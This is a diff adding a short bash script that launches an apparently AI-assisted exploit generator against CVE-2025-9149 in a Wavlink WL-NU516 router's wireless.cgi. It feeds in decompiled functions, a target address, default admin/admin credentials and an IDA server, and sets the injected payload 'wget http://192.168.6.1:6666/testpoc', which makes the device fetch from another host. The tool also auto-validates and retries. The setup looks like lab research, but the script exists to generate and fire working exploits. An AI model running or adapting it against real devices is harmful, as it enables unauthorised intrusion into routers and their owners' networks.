@@ -1,0 +1,17 @@
+#!/bin/bash
+cd /home/li/LLM_POC
+python3 -m PoCGen.cli \
+  --desc /home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/desc.txt \
+  --code "/home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/相关函数/function_ftext.c" \
+         "/home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/相关函数/function_sub_4032E4.c" \
+         "/home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/相关函数/function_sub_405EA8.c" \
+         "/home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/相关函数/function_sub_407504.c" \
+         "/home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/相关函数/start.c" \
+  --target http://192.168.6.2 \
+  --binary /home/li/test_env/second_data/Wavlink_WLNU516/CVE-2025-9149/漏洞文件/wireless.cgi \
+  --ida-mcp-url http://127.0.0.1:8745/mcp \
+  --probe-target --browser-login \
+  --login-url http://192.168.6.2 \
+  --login-username admin --login-password admin \
+  --auto-validate --max-iters 5 \
+  --payload "wget http://192.168.6.1:6666/testpoc"
